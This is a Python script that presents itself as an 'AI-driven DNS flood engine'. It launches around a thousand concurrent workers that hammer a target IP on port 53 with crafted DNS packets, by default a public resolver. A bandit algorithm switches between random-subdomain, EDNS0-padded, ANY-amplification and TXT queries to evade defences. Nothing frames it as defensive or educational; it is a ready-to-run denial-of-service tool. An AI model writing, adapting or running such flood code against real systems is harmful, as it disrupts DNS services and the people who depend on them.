import asyncio
import socket
import struct
import time
import logging
import sys
import random
from pathlib import Path

# Configure persistent file logging for every transaction
LOG_PATH = Path("ai_dns_operations.log")
logging.basicConfig(
    filename=LOG_PATH,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)

# AI Multi-Armed Bandit strategy weights for adaptive DNS evasion
DNS_ARM_WEIGHTS = {
    "random_subdomain_mutation": 1.0,
    "edns0_padded_query": 1.0,
    "any_record_amplification": 1.0,
    "txt_heavy_query": 1.0
}

def select_dns_arm() -> str:
    """Epsilon-greedy heuristic selection to optimize DNS query mutations dynamically."""
    if random.random() < 0.15:
        return random.choice(list(DNS_ARM_WEIGHTS.keys()))
    return max(DNS_ARM_WEIGHTS, key=DNS_ARM_WEIGHTS.get)

def update_dns_reward(arm: str, success: bool) -> None:
    """Adjust heuristic feedback weights based on network responses."""
    if success:
        DNS_ARM_WEIGHTS[arm] = min(10.0, DNS_ARM_WEIGHTS[arm] * 1.06)
    else:
        DNS_ARM_WEIGHTS[arm] = max(0.1, DNS_ARM_WEIGHTS[arm] * 0.92)

def build_adaptive_dns_query(base_domain: str, strategy: str) -> bytes:
    """Construct mutated raw DNS packets based on the active AI strategy."""
    transaction_id = random.randint(0x0001, 0xFFFF)
    flags = 0x0100  # Standard recursion desired
    qdcount = 1
    ancount = nscount = arcount = 0
    
    # Mutate domain name based on AI selection
    if strategy == "random_subdomain_mutation":
        sub = f"test-{random.randint(100000, 999999)}"
        domain = f"{sub}.{base_domain}"
        qtype = 0x0001 # A record
    elif strategy == "edns0_padded_query":
        domain = base_domain
        qtype = 0x0001
        arcount = 1 # Include OPT record for padding
    elif strategy == "any_record_amplification":
        domain = base_domain
        qtype = 0x00FF # ANY record type
    else:
        domain = base_domain
        qtype = 0x0010 # TXT record type

    header = struct.pack("!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount)
    
    qname = b""
    for part in domain.split("."):
        qname += bytes([len(part)]) + part.encode("utf-8")
    qname += b"\x00"
    
    question = qname + struct.pack("!HH", qtype, 0x0001)
    packet = header + question

    # Append EDNS0 pseudo-section if padding strategy is active
    if strategy == "edns0_padded_query":
        # OPT record: name (root), type (41 for OPT), UDP payload size (4096), extended rcode/flags, data length + padding bytes
        opt_record = b"\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x20" + b"\x41" * 32
        packet += opt_record

    return packet

async def ai_dns_worker(target_ip: str, base_domain: str, sem: asyncio.Semaphore, stats: dict) -> None:
    """Asynchronous worker executing high-frequency mutated DNS queries with integrated AI feedback."""
    loop = asyncio.get_running_loop()
    
    while stats["running"]:
        strategy = select_dns_arm()
        query_packet = build_adaptive_dns_query(base_domain, strategy)
        success_flag = False
        transport = None
        
        async with sem:
            try:
                connect_future = loop.create_datagram_endpoint(
                    lambda: asyncio.DatagramProtocol(),
                    remote_addr=(target_ip, 53)
                )
                transport, _ = await asyncio.wait_for(connect_future, timeout=2.0)
                
                transport.sendto(query_packet)
                
                log_msg = f"TARGET: {target_ip} | STRATEGY: {strategy} | BYTES: {len(query_packet)}"
                logging.info(log_msg)
                
                success_flag = True
                stats["success"] += 1
            except (asyncio.TimeoutError, OSError, socket.gaierror) as e:
                logging.error(f"TARGET: {target_ip} | STRATEGY: {strategy} | ERROR: {str(e)}")
                stats["failed"] += 1
            finally:
                if transport:
                    transport.close()
                update_dns_reward(strategy, success_flag)
                stats["total"] += 1

async def main() -> None:
    target_ip = sys.argv[1] if len(sys.argv) > 1 else "1.1.1.1"
    base_domain = sys.argv[2] if len(sys.argv) > 2 else "example.com"
    concurrency = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
    duration = int(sys.argv[4]) if len(sys.argv) > 4 else 30

    stats = {"running": True, "success": 0, "failed": 0, "total": 0}
    sem = asyncio.Semaphore(concurrency)

    print(f"[*] Firing up AI-driven DNS flood engine -> Target: {target_ip} | Concurrency: {concurrency}")
    print(f"[*] Transaction logs writing to: {LOG_PATH.resolve()}")

    workers = [asyncio.create_task(ai_dns_worker(target_ip, base_domain, sem, stats)) for _ in range(concurrency)]

    await asyncio.sleep(duration)
    stats["running"] = False

    await asyncio.gather(*workers, return_exceptions=True)

    print("\n--- AI DNS FLOOD METRICS ---")
    print(f"Total Operations Executed : {stats['total']}")
    print(f"Successful Dispatches     : {stats['success']}")
    print(f"Dropped / Timeouts        : {stats['failed']}")
    print("\nFinal AI Strategy Weights:")
    for arm, weight in DNS_ARM_WEIGHTS.items():
        print(f" - {arm:<28} : {weight:.3f}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Execution interrupted by operator.")
